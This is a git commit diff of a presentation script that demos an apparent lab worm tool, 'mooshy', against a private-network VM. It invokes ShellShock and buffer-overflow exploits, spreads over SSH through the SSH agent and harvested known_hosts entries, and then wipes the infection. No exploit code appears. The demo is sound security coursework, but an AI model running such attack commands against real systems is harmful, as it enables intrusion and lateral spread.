286a59a5ac6ca76c1a315e29f046aef63954345f
Roman Volosatovs <rvolosatovs@riseup.net>
2018-04-16 17:34:04 +0200

    presentation: Update script

--- presentation.sh
+++ presentation.sh
@@ -1,28 +1,50 @@
 #!/usr/bin/env bash
-mooshy -tcp :42424 -addr 192.168.188.28:22
+set -x
 
-ssh 192.168.188.28 'cat /usr/lib/cgi-bin/index.cgi'
-curl -sL http://192.168.188.28/cgi-bin/index.cgi
-ssh 192.168.188.28 'cat /lib/systemd/system/systemd-timesync.service'
-ssh 192.168.188.28 'ls -alh /lib/systemd/systemd-timesync'
+ip=192.168.56.101
 
-mooshy -shellShock -addr http://192.168.188.28/cgi-bin/index.cgi
-ssh 192.168.188.28 'cat /lib/systemd/system/systemd-timesync.service'
-ssh 192.168.188.28 'ls -alh /lib/systemd/systemd-timesync'
+ssh ${ip} 'cat /lib/systemd/system/systemd-timesync.service'
+ssh ${ip} 'ls -alh /lib/systemd/systemd-timesync'
+echo "---"
+timeout 5 mooshy -addr ${ip}:22
 
-mooshy -tcp :42424 -addr 192.168.188.28:22
+sleep 5
 
-mooshy -tcp :42424 -addr 192.168.188.28:22 -wipe 
-ssh 192.168.188.28 'cat /lib/systemd/system/systemd-timesync.service'
-ssh 192.168.188.28 'ls -alh /lib/systemd/systemd-timesync'
+cowsay "ShellShock"
+ssh ${ip} 'cat /usr/lib/cgi-bin/index.cgi'
+curl -sL http://${ip}/cgi-bin/index.cgi
+echo "---"
+mooshy -shellShock -addr http://${ip}/cgi-bin/index.cgi
+echo "---"
+ssh ${ip} 'cat /lib/systemd/system/systemd-timesync.service'
+ssh ${ip} 'ls -alh /lib/systemd/systemd-timesync'
+echo "---"
+mooshy -addr ${ip}:22
 
-mooshy -tcp :42424 -addr 192.168.188.28:22
+mooshy -addr ${ip}:22 -wipe 
 
-mooshy -bufferOverflow -addr 192.168.188.28:8080
-mooshy -tcp :42424 -addr 192.168.188.28:22
-mooshy -tcp :42424 -addr 192.168.188.28:22 -wipe 
+echo "---"
+ssh ${ip} 'cat /lib/systemd/system/systemd-timesync.service'
+ssh ${ip} 'ls -alh /lib/systemd/systemd-timesync'
+echo "---"
+timeout 5 mooshy -addr ${ip}:22
 
-cat ~/.ssh/known_hosts | grep '192.168.188.28' > known_hosts
+cowsay "Buffer Overflow"
+echo "Now execute 'killall hhttpd; hhttpd'"
+ssh ${ip} 'rm -f x*'
+ssh ${ip}
+
+mooshy -bufferOverflow -addr ${ip}:8080
+sleep 20
+mooshy -addr ${ip}:22
+mooshy -addr ${ip}:22 -wipe 
+
+cowsay "SSH"
+cat ~/.ssh/known_hosts | grep ${ip} > known_hosts
 cat known_hosts
+echo "---"
 mooshy -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts
-mooshy -tcp :42424 -addr 192.168.188.28:22
+sleep 5
+mooshy -addr ${ip}:22
+
+mooshy -addr ${ip}:22 -wipe
